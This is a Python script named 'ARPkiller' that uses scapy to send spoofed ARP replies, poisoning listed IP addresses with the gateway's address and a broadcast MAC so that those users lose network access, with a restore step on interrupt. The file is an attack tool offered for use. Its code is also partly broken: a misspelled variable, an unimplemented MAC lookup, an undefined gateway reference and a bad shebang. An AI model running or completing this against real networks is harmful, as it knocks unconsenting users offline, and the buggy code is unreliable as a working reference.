#!/usr/env/python3

from scapy.all import *
import os
import sys
import threading
import signal
import getopt
import re
import time

DEFAULT_PACKET_PER_MIN = 6

def usage():
    print("ARPkiller - Disconnect users from the network")
    print()
    print("Flags:")
    print("{} - colon (:) seperated list of target ip addresses".format("\t-t --targets".ljust(20," ")))
    print("{} - number of packets to send per minute (default: 6)".format("\t-p --packets".ljust(20," ")))
    print()


def main():

    # scapy config
    #conf.iface = interface
    conf.verb = 0
    
    # If being used in command line mode
    if len(sys.argv) > 1:
        try: 
            opts,args = getopt.getopt(sys.argv[1:],"t:p:",["targets","packets"])
        except getopt.GetoptError as e:
            print(str(e))
            usage()
        target_list = ""
        packets_per_min = DEFAULT_PACKET_PER_MIN
        for o,a in opts:
            if o in ("-t","--targets"):
                target_list = a
                print(target_list)
            elif o in ("-p","--packets"):
                packets_per_min = int(a)
            else:
                print("[!] Invalid option {} with value {}".format(o,a))
                sys.exit(1)

        if packets_per_min <= 0:
            print("[!] Packets per minute must be a positive integer")
            sys.exit(1)

        if re.match(r'^\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}(:\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}){0,}$', target_list):
            target_list = target_list.split(":")

            gateway_ip = get_gateway_ip()
            gateway_mac = get_mac(gateway_ip)

            print("[+] Starting attack [CTRL-C to stop]")

            while True:
                try:
                    for target in target_list:
                        poison_target(target, gateway_ip)
                    time.sleep(60/packets_per_min)
                except KeyboardInterrupt:
                    for target in target_list:
                        restore_target(target, gateway_ip, gateway_mac)
                    print("[+] Shutting down attack")
                    sys.exit(0)

        else:
            print("[!] Invalid list of targets, should be colon (:) seperated IP addresses")
            sys.exit(1)
    else:
        pass


def poison_target(target, gateway_ip):
    packet = ARP()
    packet.op = 2
    packet.psrc = gateway_ip
    packet.pdst = target
    packet.hwsrc = 'ff:ff:ff:ff:ff:ff'
    packet.hwdst = get_mac(targt)

    print("[+] Sending poisoned packet to {}".format(target))
    send(packet)


def restore_target(target, gateway_ip, gateway_mac):
    print("[+] Restoring target {}".format(target))
    packet = ARP()
    packet.op = 2
    packet.psrc = gateway_ip
    packet.pdst = target
    packet.hwsrc = gateway_mac

    print("[+] Sending restore packet to {}".format(target))
    send(packet)

def get_mac(ip_address):
    pass


def get_gateway_ip():
    try:
        print("[+] Looking for gateway ip")
        gateway = sr1(IP(dst="www.google.com", ttl=0) / ICMP() / "XXXXXXXXXXX", verbose=False)
        print("[+] Found gateway ip at {}".format(gateway))
        return getGateway.src
    except:
        print("[-] Could not get gateway IP, please enter IP manually")
        return input("<APRkiller:#> Gateway IP: ")



if __name__ == '__main__':
    main()